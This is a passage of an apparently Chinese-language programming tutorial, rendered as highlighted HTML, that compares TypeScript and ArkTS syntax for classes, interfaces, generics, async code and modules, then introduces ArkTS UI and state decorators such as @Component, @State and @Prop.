    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Woof! Woof!'</span>);
  }
}

<span class="hljs-keyword">const</span> dog = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Dog</span>(<span class="hljs-string">'Buddy'</span>);
dog.<span class="hljs-title function_">bark</span>();
dog.<span class="hljs-title function_">move</span>(<span class="hljs-number">10</span>);
</code></pre>
<p><strong>ArkTS:</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// ArkTSç»§æ‰¿æ–¹å¼ç›¸åŒ</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Animal</span> {
  <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>;
  
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">name: <span class="hljs-built_in">string</span></span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
  }
  
  <span class="hljs-title function_">move</span>(<span class="hljs-attr">distance</span>: <span class="hljs-built_in">number</span> = <span class="hljs-number">0</span>): <span class="hljs-built_in">void</span> {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">info</span>(<span class="hljs-string">`<span class="hljs-subst">${<span class="hljs-variable language_">this</span>.name}</span> moved <span class="hljs-subst">${distance}</span>m.`</span>);
  }
}

<span class="hljs-keyword">class</span> <span class="hljs-title class_">Dog</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">Animal</span> {
  <span class="hljs-title function_">bark</span>(): <span class="hljs-built_in">void</span> {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">info</span>(<span class="hljs-string">'Woof! Woof!'</span>);
  }
}

<span class="hljs-keyword">const</span> dog = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Dog</span>(<span class="hljs-string">'Buddy'</span>);
dog.<span class="hljs-title function_">bark</span>();
dog.<span class="hljs-title function_">move</span>(<span class="hljs-number">10</span>);
</code></pre>
<h4 data-id="heading-21">é™æ€æˆå‘˜</h4>
<p><strong>TypeScript:</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MathUtil</span> {
  <span class="hljs-keyword">static</span> <span class="hljs-attr">PI</span>: <span class="hljs-built_in">number</span> = <span class="hljs-number">3.14159</span>;
  
  <span class="hljs-keyword">static</span> <span class="hljs-title function_">calculateCircumference</span>(<span class="hljs-attr">radius</span>: <span class="hljs-built_in">number</span>): <span class="hljs-built_in">number</span> {
    <span class="hljs-keyword">return</span> <span class="hljs-number">2</span> * <span class="hljs-title class_">MathUtil</span>.<span class="hljs-property">PI</span> * radius;
  }
}

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">MathUtil</span>.<span class="hljs-property">PI</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">MathUtil</span>.<span class="hljs-title function_">calculateCircumference</span>(<span class="hljs-number">10</span>));
</code></pre>
<p><strong>ArkTS:</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// ArkTSé™æ€æˆå‘˜ç”¨æ³•ç›¸åŒ</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">MathUtil</span> {
  <span class="hljs-keyword">static</span> <span class="hljs-attr">PI</span>: <span class="hljs-built_in">number</span> = <span class="hljs-number">3.14159</span>;
  
  <span class="hljs-keyword">static</span> <span class="hljs-title function_">calculateCircumference</span>(<span class="hljs-attr">radius</span>: <span class="hljs-built_in">number</span>): <span class="hljs-built_in">number</span> {
    <span class="hljs-keyword">return</span> <span class="hljs-number">2</span> * <span class="hljs-title class_">MathUtil</span>.<span class="hljs-property">PI</span> * radius;
  }
}

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">info</span>(<span class="hljs-title class_">MathUtil</span>.<span class="hljs-property">PI</span>.<span class="hljs-title function_">toString</span>());
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">info</span>(<span class="hljs-title class_">MathUtil</span>.<span class="hljs-title function_">calculateCircumference</span>(<span class="hljs-number">10</span>).<span class="hljs-title function_">toString</span>());
</code></pre>
<h3 data-id="heading-22">æ¥å£</h3>
<h4 data-id="heading-23">æ¥å£å®šä¹‰</h4>
<p><strong>TypeScript:</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">interface</span> <span class="hljs-title class_">User</span> {
  <span class="hljs-attr">id</span>: <span class="hljs-built_in">number</span>;
  <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>;
  email?: <span class="hljs-built_in">string</span>;
  <span class="hljs-keyword">readonly</span> <span class="hljs-attr">createdAt</span>: <span class="hljs-title class_">Date</span>;
}

<span class="hljs-keyword">interface</span> <span class="hljs-title class_">Searchable</span> {
  <span class="hljs-title function_">search</span>(<span class="hljs-attr">keyword</span>: <span class="hljs-built_in">string</span>): <span class="hljs-title class_">User</span>[];
}

<span class="hljs-keyword">class</span> <span class="hljs-title class_">UserService</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Searchable</span> {
  <span class="hljs-title function_">search</span>(<span class="hljs-attr">keyword</span>: <span class="hljs-built_in">string</span>): <span class="hljs-title class_">User</span>[] {
    <span class="hljs-comment">// å®ç°æœç´¢é€»è¾‘</span>
    <span class="hljs-keyword">return</span> [];
  }
}
</code></pre>
<p><strong>ArkTS:</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// ArkTSæ¥å£å®šä¹‰æ–¹å¼ç›¸åŒ</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">User</span> {
  <span class="hljs-attr">id</span>: <span class="hljs-built_in">number</span>;
  <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>;
  email?: <span class="hljs-built_in">string</span>;
  <span class="hljs-keyword">readonly</span> <span class="hljs-attr">createdAt</span>: <span class="hljs-title class_">Date</span>;
}

<span class="hljs-keyword">interface</span> <span class="hljs-title class_">Searchable</span> {
  <span class="hljs-title function_">search</span>(<span class="hljs-attr">keyword</span>: <span class="hljs-built_in">string</span>): <span class="hljs-title class_">User</span>[];
}

<span class="hljs-keyword">class</span> <span class="hljs-title class_">UserService</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Searchable</span> {
  <span class="hljs-title function_">search</span>(<span class="hljs-attr">keyword</span>: <span class="hljs-built_in">string</span>): <span class="hljs-title class_">User</span>[] {
    <span class="hljs-keyword">return</span> [];
  }
}
</code></pre>
<h4 data-id="heading-24">æ¥å£ç»§æ‰¿</h4>
<p><strong>TypeScript:</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">interface</span> <span class="hljs-title class_">Shape</span> {
  <span class="hljs-attr">color</span>: <span class="hljs-built_in">string</span>;
}

<span class="hljs-keyword">interface</span> <span class="hljs-title class_">Square</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Shape</span> {
  <span class="hljs-attr">sideLength</span>: <span class="hljs-built_in">number</span>;
}

<span class="hljs-keyword">let</span> <span class="hljs-attr">square</span>: <span class="hljs-title class_">Square</span> = {
  <span class="hljs-attr">color</span>: <span class="hljs-string">"blue"</span>,
  <span class="hljs-attr">sideLength</span>: <span class="hljs-number">10</span>
};
</code></pre>
<p><strong>ArkTS:</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// ArkTSæ¥å£ç»§æ‰¿æ–¹å¼ç›¸åŒ</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">Shape</span> {
  <span class="hljs-attr">color</span>: <span class="hljs-built_in">string</span>;
}

<span class="hljs-keyword">interface</span> <span class="hljs-title class_">Square</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Shape</span> {
  <span class="hljs-attr">sideLength</span>: <span class="hljs-built_in">number</span>;
}

<span class="hljs-keyword">let</span> <span class="hljs-attr">square</span>: <span class="hljs-title class_">Square</span> = {
  <span class="hljs-attr">color</span>: <span class="hljs-string">"blue"</span>,
  <span class="hljs-attr">sideLength</span>: <span class="hljs-number">10</span>
};
</code></pre>
<h3 data-id="heading-25">æ³›å‹</h3>
<h4 data-id="heading-26">æ³›å‹å‡½æ•°</h4>
<p><strong>TypeScript:</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">function</span> identity&lt;T&gt;(<span class="hljs-attr">arg</span>: T): T {
  <span class="hljs-keyword">return</span> arg;
}

<span class="hljs-keyword">let</span> output1 = identity&lt;<span class="hljs-built_in">string</span>&gt;(<span class="hljs-string">"hello"</span>);
<span class="hljs-keyword">let</span> output2 = identity&lt;<span class="hljs-built_in">number</span>&gt;(<span class="hljs-number">42</span>);
</code></pre>
<p><strong>ArkTS:</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// ArkTSæ”¯æŒæ³›å‹</span>
<span class="hljs-keyword">function</span> identity&lt;T&gt;(<span class="hljs-attr">arg</span>: T): T {
  <span class="hljs-keyword">return</span> arg;
}

<span class="hljs-keyword">let</span> output1 = identity&lt;<span class="hljs-built_in">string</span>&gt;(<span class="hljs-string">"hello"</span>);
<span class="hljs-keyword">let</span> output2 = identity&lt;<span class="hljs-built_in">number</span>&gt;(<span class="hljs-number">42</span>);
</code></pre>
<h4 data-id="heading-27">æ³›å‹ç±»</h4>
<p><strong>TypeScript:</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">GenericNumber</span>&lt;T&gt; {
  <span class="hljs-attr">zeroValue</span>: T;
  <span class="hljs-attr">add</span>: <span class="hljs-function">(<span class="hljs-params">x: T, y: T</span>) =&gt;</span> T;
}

<span class="hljs-keyword">let</span> myGenericNumber = <span class="hljs-keyword">new</span> <span class="hljs-title class_">GenericNumber</span>&lt;<span class="hljs-built_in">number</span>&gt;();
myGenericNumber.<span class="hljs-property">zeroValue</span> = <span class="hljs-number">0</span>;
myGenericNumber.<span class="hljs-property">add</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params">x, y</span>) { <span class="hljs-keyword">return</span> x + y; };
</code></pre>
<p><strong>ArkTS:</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// ArkTSæ³›å‹ç±»ç”¨æ³•ç›¸åŒ</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">GenericNumber</span>&lt;T&gt; {
  <span class="hljs-attr">zeroValue</span>: T;
  <span class="hljs-attr">add</span>: <span class="hljs-function">(<span class="hljs-params">x: T, y: T</span>) =&gt;</span> T;
}

<span class="hljs-keyword">let</span> myGenericNumber = <span class="hljs-keyword">new</span> <span class="hljs-title class_">GenericNumber</span>&lt;<span class="hljs-built_in">number</span>&gt;();
myGenericNumber.<span class="hljs-property">zeroValue</span> = <span class="hljs-number">0</span>;
myGenericNumber.<span class="hljs-property">add</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params">x, y</span>) { <span class="hljs-keyword">return</span> x + y; };
</code></pre>
<h4 data-id="heading-28">æ³›å‹çº¦æŸ</h4>
<p><strong>TypeScript:</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">interface</span> <span class="hljs-title class_">Lengthwise</span> {
  <span class="hljs-attr">length</span>: <span class="hljs-built_in">number</span>;
}

<span class="hljs-keyword">function</span> logLength&lt;T <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Lengthwise</span>&gt;(<span class="hljs-attr">arg</span>: T): T {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(arg.<span class="hljs-property">length</span>);
  <span class="hljs-keyword">return</span> arg;
}

<span class="hljs-title function_">logLength</span>({ <span class="hljs-attr">length</span>: <span class="hljs-number">10</span>, <span class="hljs-attr">value</span>: <span class="hljs-number">3</span> });
</code></pre>
<p><strong>ArkTS:</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// ArkTSæ³›å‹çº¦æŸç”¨æ³•ç›¸åŒ</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">Lengthwise</span> {
  <span class="hljs-attr">length</span>: <span class="hljs-built_in">number</span>;
}

<span class="hljs-keyword">function</span> logLength&lt;T <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Lengthwise</span>&gt;(<span class="hljs-attr">arg</span>: T): T {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">info</span>(arg.<span class="hljs-property">length</span>.<span class="hljs-title function_">toString</span>());
  <span class="hljs-keyword">return</span> arg;
}
</code></pre>
<h3 data-id="heading-29">å¼‚æ­¥ç¼–ç¨‹</h3>
<h4 data-id="heading-30">Promise</h4>
<p><strong>TypeScript:</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">fetchData</span>(<span class="hljs-params"/>): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-built_in">string</span>&gt; {
  <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve, reject</span>) =&gt;</span> {
    <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {
      <span class="hljs-title function_">resolve</span>(<span class="hljs-string">"Data loaded"</span>);
    }, <span class="hljs-number">1000</span>);
  });
}

<span class="hljs-title function_">fetchData</span>()
  .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">data</span> =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(data))
  .<span class="hljs-title function_">catch</span>(<span class="hljs-function"><span class="hljs-params">error</span> =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(error));
</code></pre>
<p><strong>ArkTS:</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// ArkTSæ”¯æŒPromise</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">fetchData</span>(<span class="hljs-params"/>): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-built_in">string</span>&gt; {
  <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve, reject</span>) =&gt;</span> {
    <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {
      <span class="hljs-title function_">resolve</span>(<span class="hljs-string">"Data loaded"</span>);
    }, <span class="hljs-number">1000</span>);
  });
}

<span class="hljs-title function_">fetchData</span>()
  .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">data</span> =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">info</span>(data))
  .<span class="hljs-title function_">catch</span>(<span class="hljs-function"><span class="hljs-params">error</span> =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(error));
</code></pre>
<h4 data-id="heading-31">async/await</h4>
<p><strong>TypeScript:</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">loadUserData</span>(<span class="hljs-params">userId: <span class="hljs-built_in">number</span></span>): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-title class_">User</span>&gt; {
  <span class="hljs-keyword">try</span> {
    <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">`/api/users/<span class="hljs-subst">${userId}</span>`</span>);
    <span class="hljs-keyword">const</span> user = <span class="hljs-keyword">await</span> response.<span class="hljs-title function_">json</span>();
    <span class="hljs-keyword">return</span> user;
  } <span class="hljs-keyword">catch</span> (error) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'Failed to load user:'</span>, error);
    <span class="hljs-keyword">throw</span> error;
  }
}

<span class="hljs-comment">// ä½¿ç”¨</span>
<span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">main</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> user = <span class="hljs-keyword">await</span> <span class="hljs-title function_">loadUserData</span>(<span class="hljs-number">1</span>);
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(user);
}
</code></pre>
<p><strong>ArkTS:</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// ArkTSæ”¯æŒasync/await</span>
<span class="hljs-keyword">import</span> http <span class="hljs-keyword">from</span> <span class="hljs-string">'@ohos.net.http'</span>;

<span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">loadUserData</span>(<span class="hljs-params">userId: <span class="hljs-built_in">number</span></span>): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-built_in">object</span>&gt; {
  <span class="hljs-keyword">try</span> {
    <span class="hljs-keyword">let</span> httpRequest = http.<span class="hljs-title function_">createHttp</span>();
    <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> httpRequest.<span class="hljs-title function_">request</span>(<span class="hljs-string">`https://api.example.com/users/<span class="hljs-subst">${userId}</span>`</span>);
    <span class="hljs-keyword">return</span> <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(response.<span class="hljs-property">result</span>.<span class="hljs-title function_">toString</span>());
  } <span class="hljs-keyword">catch</span> (error) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'Failed to load user:'</span>, error);
    <span class="hljs-keyword">throw</span> error;
  }
}

<span class="hljs-comment">// ä½¿ç”¨</span>
<span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">main</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> user = <span class="hljs-keyword">await</span> <span class="hljs-title function_">loadUserData</span>(<span class="hljs-number">1</span>);
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">info</span>(<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(user));
}
</code></pre>
<h3 data-id="heading-32">æ¨¡å—ç³»ç»Ÿ</h3>
<h4 data-id="heading-33">å¯¼å‡º</h4>
<p><strong>TypeScript:</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// utils.ts</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">a: <span class="hljs-built_in">number</span>, b: <span class="hljs-built_in">number</span></span>): <span class="hljs-built_in">number</span> {
  <span class="hljs-keyword">return</span> a + b;
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Calculator</span> {
  <span class="hljs-title function_">multiply</span>(<span class="hljs-attr">a</span>: <span class="hljs-built_in">number</span>, <span class="hljs-attr">b</span>: <span class="hljs-built_in">number</span>): <span class="hljs-built_in">number</span> {
    <span class="hljs-keyword">return</span> a * b;
  }
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MathUtil</span> {
  <span class="hljs-keyword">static</span> <span class="hljs-variable constant_">PI</span> = <span class="hljs-number">3.14159</span>;
}
</code></pre>
<p><strong>ArkTS:</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// utils.ets</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">a: <span class="hljs-built_in">number</span>, b: <span class="hljs-built_in">number</span></span>): <span class="hljs-built_in">number</span> {
  <span class="hljs-keyword">return</span> a + b;
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Calculator</span> {
  <span class="hljs-title function_">multiply</span>(<span class="hljs-attr">a</span>: <span class="hljs-built_in">number</span>, <span class="hljs-attr">b</span>: <span class="hljs-built_in">number</span>): <span class="hljs-built_in">number</span> {
    <span class="hljs-keyword">return</span> a * b;
  }
}

<span class="hljs-comment">// ArkTSä¹Ÿæ”¯æŒé»˜è®¤å¯¼å‡º</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MathUtil</span> {
  <span class="hljs-keyword">static</span> <span class="hljs-variable constant_">PI</span> = <span class="hljs-number">3.14159</span>;
}
</code></pre>
<h4 data-id="heading-34">å¯¼å…¥</h4>
<p><strong>TypeScript:</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// å‘½åå¯¼å…¥</span>
<span class="hljs-keyword">import</span> { add, <span class="hljs-title class_">Calculator</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'./utils'</span>;

<span class="hljs-comment">// é»˜è®¤å¯¼å…¥</span>
<span class="hljs-keyword">import</span> <span class="hljs-title class_">MathUtil</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'./utils'</span>;

<span class="hljs-comment">// å¯¼å…¥æ‰€æœ‰</span>
<span class="hljs-keyword">import</span> * <span class="hljs-keyword">as</span> <span class="hljs-title class_">Utils</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'./utils'</span>;

<span class="hljs-comment">// é‡å‘½åå¯¼å…¥</span>
<span class="hljs-keyword">import</span> { add <span class="hljs-keyword">as</span> sum } <span class="hljs-keyword">from</span> <span class="hljs-string">'./utils'</span>;
</code></pre>
<p><strong>ArkTS:</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// ArkTSå¯¼å…¥æ–¹å¼ç›¸åŒ</span>
<span class="hljs-keyword">import</span> { add, <span class="hljs-title class_">Calculator</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'./utils'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-title class_">MathUtil</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'./utils'</span>;
<span class="hljs-keyword">import</span> * <span class="hljs-keyword">as</span> <span class="hljs-title class_">Utils</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'./utils'</span>;
<span class="hljs-keyword">import</span> { add <span class="hljs-keyword">as</span> sum } <span class="hljs-keyword">from</span> <span class="hljs-string">'./utils'</span>;
</code></pre>
<hr/>
<h2 data-id="heading-35">ArkTSç‹¬æœ‰ç‰¹æ€§ï¼ˆTypeScriptæ²¡æœ‰çš„ï¼‰</h2>
<h3 data-id="heading-36">1. å£°æ˜å¼UIè£…é¥°å™¨ç³»ç»Ÿ</h3>
<p>è¿™æ˜¯ArkTSæœ€é‡è¦çš„ç‰¹æ€§ä¹‹ä¸€ï¼ŒTypeScriptå®Œå…¨æ²¡æœ‰è¿™å¥—ä½“ç³»ã€‚</p>
<h4 data-id="heading-37">@Component - è‡ªå®šä¹‰ç»„ä»¶è£…é¥°å™¨</h4>
<p><strong>ArkTSç‹¬æœ‰ï¼š</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// TypeScriptä¸­æ²¡æœ‰è¿™ç§ç»„ä»¶è£…é¥°å™¨</span>
<span class="hljs-meta">@Component</span>
struct <span class="hljs-title class_">CustomButton</span> {
  <span class="hljs-keyword">private</span> <span class="hljs-attr">text</span>: <span class="hljs-built_in">string</span> = <span class="hljs-string">'Click'</span>;
  
  <span class="hljs-title function_">build</span>(<span class="hljs-params"/>) {
    <span class="hljs-title class_">Button</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">text</span>)
      .<span class="hljs-title function_">width</span>(<span class="hljs-number">100</span>)
      .<span class="hljs-title function_">height</span>(<span class="hljs-number">40</span>)
  }
}
</code></pre>
<h4 data-id="heading-38">@Entry - é¡µé¢å…¥å£è£…é¥°å™¨</h4>
<p><strong>ArkTSç‹¬æœ‰ï¼š</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// æ ‡è®°é¡µé¢å…¥å£ç»„ä»¶ï¼ŒTypeScriptæ²¡æœ‰è¿™ä¸ªæ¦‚å¿µ</span>
<span class="hljs-meta">@Entry</span>
<span class="hljs-meta">@Component</span>
struct <span class="hljs-title class_">HomePage</span> {
  <span class="hljs-title function_">build</span>(<span class="hljs-params"/>) {
    <span class="hljs-title class_">Column</span>() {
      <span class="hljs-title class_">Text</span>(<span class="hljs-string">'Home Page'</span>)
    }
  }
}
</code></pre>
<h4 data-id="heading-39">@Preview - é¢„è§ˆè£…é¥°å™¨</h4>
<p><strong>ArkTSç‹¬æœ‰ï¼š</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// ç”¨äºåœ¨DevEco Studioä¸­é¢„è§ˆç»„ä»¶ï¼ŒTypeScriptæ²¡æœ‰</span>
<span class="hljs-meta">@Preview</span>
<span class="hljs-meta">@Component</span>
struct <span class="hljs-title class_">PreviewComponent</span> {
  <span class="hljs-title function_">build</span>(<span class="hljs-params"/>) {
    <span class="hljs-title class_">Text</span>(<span class="hljs-string">'Preview Mode'</span>)
      .<span class="hljs-title function_">fontSize</span>(<span class="hljs-number">20</span>)
  }
}
</code></pre>
<h3 data-id="heading-40">2. çŠ¶æ€ç®¡ç†è£…é¥°å™¨</h3>
<p>è¿™æ˜¯ArkTSæœ€æ ¸å¿ƒçš„ç‰¹æ€§ï¼Œç”¨äºå“åº”å¼UIå¼€å‘ï¼ŒTypeScriptå®Œå…¨æ²¡æœ‰ã€‚</p>
<h4 data-id="heading-41">@State - ç»„ä»¶å†…éƒ¨çŠ¶æ€</h4>
<p><strong>ArkTSç‹¬æœ‰ï¼š</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-meta">@Component</span>
struct <span class="hljs-title class_">Counter</span> {
  <span class="hljs-comment">// @Stateè£…é¥°å™¨ä½¿å˜é‡å…·æœ‰å“åº”å¼èƒ½åŠ›</span>
  <span class="hljs-comment">// å½“countå˜åŒ–æ—¶ï¼ŒUIä¼šè‡ªåŠ¨æ›´æ–°</span>
  <span class="hljs-meta">@State</span> <span class="hljs-attr">count</span>: <span class="hljs-built_in">number</span> = <span class="hljs-number">0</span>;
  
  <span class="hljs-title function_">build</span>(<span class="hljs-params"/>) {
    <span class="hljs-title class_">Column</span>() {
      <span class="hljs-title class_">Text</span>(<span class="hljs-string">`Count: <span class="hljs-subst">${<span class="hljs-variable language_">this</span>.count}</span>`</span>)
      <span class="hljs-title class_">Button</span>(<span class="hljs-string">'Increase'</span>)
        .<span class="hljs-title function_">onClick</span>(<span class="hljs-function">() =&gt;</span> {
          <span class="hljs-variable language_">this</span>.<span class="hljs-property">count</span>++; <span class="hljs-comment">// ä¿®æ”¹ä¼šè§¦å‘UIåˆ·æ–°</span>
        })
    }
  }
}
</code></pre>
<p><strong>TypeScriptå¯¹æ¯”ï¼š</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// TypeScriptéœ€è¦æ‰‹åŠ¨ç®¡ç†çŠ¶æ€æ›´æ–°</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Counter</span> {
  <span class="hljs-keyword">private</span> <span class="hljs-attr">count</span>: <span class="hljs-built_in">number</span> = <span class="hljs-number">0</span>;
  
  <span class="hljs-title function_">increase</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">count</span>++;
    <span class="hljs-comment">// éœ€è¦æ‰‹åŠ¨è°ƒç”¨æ¸²æŸ“å‡½æ•°</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">render</span>();
  }
  
  <span class="hljs-title function_">render</span>(<span class="hljs-params"/>) {
    <span class="hljs-comment">// æ‰‹åŠ¨æ›´æ–°DOM</span>
  }
}
</code></pre>
<h4 data-id="heading-42">@Prop - å•å‘æ•°æ®ä¼ é€’</h4>
<p><strong>ArkTSç‹¬æœ‰ï¼š</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-meta">@Component</span>
struct <span class="hljs-title class_">ChildComponent</span> {
  <span class="hljs-comment">// @Propä»çˆ¶ç»„ä»¶æ¥æ”¶æ•°æ®ï¼Œå•å‘ä¼ é€’</span>
  <span class="hljs-comment">// å­ç»„ä»¶ä¸èƒ½ä¿®æ”¹@Propè£…é¥°çš„å˜é‡</span>
  <span class="hljs-meta">@Prop</span> <span class="hljs-attr">message</span>: <span class="hljs-built_in">string</span>;
  
  <span class="hljs-title function_">build</span>(<span class="hljs-params"/>) {
    <span class="hljs-title class_">Text</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">message</span>)
  }
}

<span class="hljs-meta">@Entry</span>
<span class="hljs-meta">@Component</span>
struct <span class="hljs-title class_">ParentComponent</span> {
  <span class="hljs-meta">@State</span> <span class="hljs-attr">parentMessage</span>: <span class="hljs-built_in">string</span> = <span class="hljs-string">'Hello'</span>;
  
  <span class="hljs-title function_">build</span>(<span class="hljs-params"/>) {
    <span class="hljs-title class_">Column</span>() {
      <span class="hljs-title class_">ChildComponent</span>({ <span class="hljs-attr">message</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-property">parentMessage</span> })
      <span class="hljs-title class_">Button</span>(<span class="hljs-string">'Change'</span>)
        .<span class="hljs-title function_">onClick</span>(<span class="hljs-function">() =&gt;</span> {
          <span class="hljs-variable language_">this</span>.<span class="hljs-property">parentMessage</span> = <span class="hljs-string">'Hi'</span>; <span class="hljs-comment">// å­ç»„ä»¶ä¼šè‡ªåŠ¨æ›´æ–°</span>
        })
    }
  }
}
</code></pre>
<h4 data-id="heading-43">@Link - åŒå‘æ•°æ®ç»‘å®š</h4>
<p><strong>ArkTSç‹¬æœ‰ï¼š</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-meta">@Component</span>
struct <span class="hljs-title class_">ChildComponent</span> {
